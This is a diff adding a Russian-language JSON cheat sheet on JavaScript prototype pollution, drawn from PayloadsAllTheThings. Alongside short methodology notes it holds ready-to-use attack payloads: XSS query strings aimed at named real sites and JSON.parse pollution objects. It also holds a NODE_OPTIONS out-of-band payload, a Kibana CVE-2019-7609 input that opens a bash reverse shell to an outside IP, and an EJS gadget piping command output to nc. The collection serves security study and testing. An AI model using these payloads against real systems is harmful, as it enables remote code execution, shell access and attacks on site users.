@@ -1,0 +1,116 @@
+{
+  "category": "Prototype Pollution",
+  "source": "PayloadsAllTheThings/Prototype Pollution/",
+  "entries": [
+    {
+      "subcategory": "Методология",
+      "title": "Что это такое",
+      "language": "text",
+      "tags": ["methodology", "intro"],
+      "body": "Prototype Pollution — уязвимость JavaScript, при которой меняются свойства Object.prototype. Объекты в JS динамичны: свойства можно добавлять в любой момент. Почти все объекты наследуют от Object.prototype, поэтому загрязнение прототипа влияет на ВСЕ объекты приложения — отсюда вектор атаки.\n\nЕсли атакующий может добавить/изменить свойство Object.prototype, это затрагивает каждый объект, который от него наследует, что ведёт к разным классам уязвимостей (от логических обходов до XSS и RCE)."
+    },
+    {
+      "subcategory": "Методология",
+      "title": "Как доходим до прототипа",
+      "language": "javascript",
+      "tags": ["methodology", "prototype"],
+      "body": "var myDog = new Dog();\n\n// Указывает на функцию-конструктор \"Dog\"\nmyDog.constructor;\n\n// Указывает на определение класса \"Dog\" (его прототип)\nmyDog.constructor.prototype;\nmyDog.__proto__;\nmyDog[\"__proto__\"];"
+    },
+    {
+      "subcategory": "Методология",
+      "title": "Суть атаки на примере config",
+      "language": "javascript",
+      "tags": ["methodology", "example"],
+      "body": "// Приложение хранит настройки в объекте:\nlet config = {\n    isAdmin: false\n};\n\n// Атакующий добавляет isAdmin прямо в Object.prototype,\n// и теперь любой объект без своего isAdmin вернёт true:\nObject.prototype.isAdmin = true;"
+    },
+    {
+      "subcategory": "Методология",
+      "title": "Ручное тестирование (ExpressJS, SSPP)",
+      "language": "text",
+      "tags": ["methodology", "manual-testing", "expressjs"],
+      "body": "Набор безопасных проб для blackbox-детекта серверного PP в ExpressJS. Загрязняем свойство через __proto__ и наблюдаем побочный эффект в ответе:\n\n• { \"__proto__\":{\"parameterLimit\":1}} + 2 параметра в GET-запросе, хотя бы 1 должен отражаться в ответе.\n• { \"__proto__\":{\"ignoreQueryPrefix\":true}} + ??foo=bar\n• { \"__proto__\":{\"allowDots\":true}} + ?foo.bar=baz\n• Изменить отступы JSON-ответа: { \"__proto__\":{\"json spaces\":\" \"}} + {\"foo\":\"bar\"} — сервер должен вернуть {\"foo\": \"bar\"}.\n• Изменить CORS-заголовки: { \"__proto__\":{\"exposedHeaders\":[\"foo\"]}} — сервер должен вернуть заголовок Access-Control-Expose-Headers.\n• Изменить код статуса: { \"__proto__\":{\"status\":510}}"
+    },
+    {
+      "subcategory": "Методология",
+      "title": "Где искать загрязнение",
+      "language": "text",
+      "tags": ["methodology", "recon", "sink"],
+      "body": "Доступ к прототипу любого объекта — через магическое свойство __proto__.\nJSON.parse() парсит JSON-строку в объект и часто является sink-функцией, где случается prototype pollution.\nИщи небезопасное рекурсивное слияние/копирование объектов (merge, extend, clone, defaultsDeep), парсинг query-string в объект, и любой код, кладущий пользовательские ключи в объект по пути.\n\nКлиент (CSPP) и сервер (SSPP) — импакт различается: CSPP обычно ведёт к DOM XSS, SSPP — к RCE/DoS/обходу логики."
+    },
+
+    {
+      "subcategory": "Client-Side (CSPP)",
+      "title": "Загрязнение через URL / hash",
+      "language": "text",
+      "tags": ["client-side", "url", "hash"],
+      "body": "Примеры PP-payload-ов, встречавшихся в реальных приложениях (фрагмент после # обрабатывается клиентским JS):\n\nhttps://victim.com/#a=b&__proto__[admin]=1\nhttps://example.com/#__proto__[xxx]=alert(1)\nhttp://server/servicedesk/customer/user/signup?__proto__.preventDefault.__proto__.handleObj.__proto__.delegateTarget=%3Cimg/src/onerror=alert(1)%3E\nhttps://www.apple.com/shop/buy-watch/apple-watch?__proto__[src]=image&__proto__[onerror]=alert(1)\nhttps://www.apple.com/shop/buy-watch/apple-watch?a[constructor][prototype]=image&a[constructor][prototype][onerror]=alert(1)"
+    },
+
+    {
+      "subcategory": "JSON-вход (JSON.parse sink)",
+      "title": "Базовый JSON-payload через __proto__",
+      "language": "json",
+      "tags": ["json", "json-parse", "proto"],
+      "body": "{\n    \"__proto__\": {\n        \"evilProperty\": \"evilPayload\"\n    }\n}"
+    },
+    {
+      "subcategory": "JSON-вход (JSON.parse sink)",
+      "title": "Загрязнение через constructor.prototype",
+      "language": "json",
+      "tags": ["json", "constructor", "prototype"],
+      "body": "{\n    \"constructor\": {\n        \"prototype\": {\n            \"foo\": \"bar\",\n            \"json spaces\": 10\n        }\n    }\n}"
+    },
+    {
+      "subcategory": "JSON-вход (JSON.parse sink)",
+      "title": "Асинхронный payload для NodeJS (OOB через NODE_OPTIONS)",
+      "language": "json",
+      "tags": ["json", "nodejs", "oob", "sspp"],
+      "body": "{\n  \"__proto__\": {\n    \"argv0\":\"node\",\n    \"shell\":\"node\",\n    \"NODE_OPTIONS\":\"--inspect=payload\\\"\\\".oastify\\\"\\\".com\"\n  }\n}"
+    },
+
+    {
+      "subcategory": "Эскалация → RCE (Node)",
+      "title": "RCE в Kibana (CVE-2019-7609)",
+      "language": "javascript",
+      "tags": ["rce", "nodejs", "kibana", "cve"],
+      "body": ".es(*).props(label.__proto__.env.AAAA='require(\"child_process\").exec(\"bash -i >& /dev/tcp/192.168.0.136/12345 0>&1\");process.exit()//')\n.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')"
+    },
+    {
+      "subcategory": "Эскалация → RCE (Node)",
+      "title": "RCE через EJS-гаджеты (SSPP)",
+      "language": "json",
+      "tags": ["rce", "nodejs", "ejs", "gadget"],
+      "body": "{\n    \"__proto__\": {\n        \"client\": 1,\n        \"escapeFunction\": \"JSON.stringify; process.mainModule.require('child_process').exec('id | nc localhost 4444')\"\n    }\n}"
+    },
+    {
+      "subcategory": "Эскалация → XSS / прочее",
+      "title": "Импакт CSPP/SSPP",
+      "language": "text",
+      "tags": ["impact", "xss", "dos"],
+      "body": "В зависимости от того, где исполняется загрязнение — на клиенте (CSPP) или сервере (SSPP) — импакт различается:\n\n• Remote Command Execution — RCE in Kibana (CVE-2019-7609); RCE через EJS-гаджеты.\n• Reflected XSS — Reflected XSS на www.hackerone.com через Wistia embed code (отчёт #986386).\n• Обход клиентских санитайзеров — Prototype pollution and bypassing client-side HTML sanitizers.\n• Denial of Service — загрязнение Object.prototype ломает логику и роняет приложение."
+    },
+
+    {
+      "subcategory": "Payload-форматы",
+      "title": "Сборник PP-payload-ов (JS / query)",
+      "language": "javascript",
+      "tags": ["payloads", "cheatsheet", "query"],
+      "body": "Object.__proto__[\"evilProperty\"]=\"evilPayload\"\nObject.__proto__.evilProperty=\"evilPayload\"\nObject.constructor.prototype.evilProperty=\"evilPayload\"\nObject.constructor[\"prototype\"][\"evilProperty\"]=\"evilPayload\"\n{\"__proto__\": {\"evilProperty\": \"evilPayload\"}}\n{\"__proto__.name\":\"test\"}\nx[__proto__][abaeead] = abaeead\nx.__proto__.edcbcab = edcbcab\n__proto__[eedffcb] = eedffcb\n__proto__.baaebfc = baaebfc\n?__proto__[test]=test"
+    },
+
+    {
+      "subcategory": "Гаджеты",
+      "title": "Что такое gadget при prototype pollution",
+      "language": "text",
+      "tags": ["gadget", "methodology"],
+      "body": "«Гаджет» — участок кода, функция или фича приложения, которые можно проэксплуатировать или использовать в ходе атаки. В контексте prototype pollution «PP-гаджет» — конкретный путь исполнения / функция / свойство, которое уязвимо к загрязнению прототипа или раскрывается через него (например, свойство, которое потом подставляется в шаблон, в спавн процесса или в опции конфигурации).\n\nЛибо собери свой гаджет из исходников приложения с помощью yeswehack/pp-finder, либо используй уже найденные гаджеты из yuske/server-side-prototype-pollution (серверные) и BlackFan/client-side-prototype-pollution (клиентские)."
+    },
+    {
+      "subcategory": "Гаджеты",
+      "title": "Тулзы и ресурсы",
+      "language": "text",
+      "tags": ["tools", "gadget"],
+      "body": "• yeswehack/pp-finder — поиск гаджетов для эксплуатации prototype pollution.\n• yuske/silent-spring — prototype pollution → RCE в Node.js.\n• yuske/server-side-prototype-pollution — серверные PP-гаджеты в ядре Node.js и сторонних NPM-пакетах.\n• BlackFan/client-side-prototype-pollution — клиентские PP и полезные script-гаджеты.\n• portswigger/server-side-prototype-pollution — расширение Burp Suite для детекта серверного PP.\n• msrkp/PPScan — клиентский сканер prototype pollution.\n\nЛабы: YesWeHack Dojo — Prototype Pollution; PortSwigger Web Security Academy — Prototype Pollution."
+    }
+  ]
+}
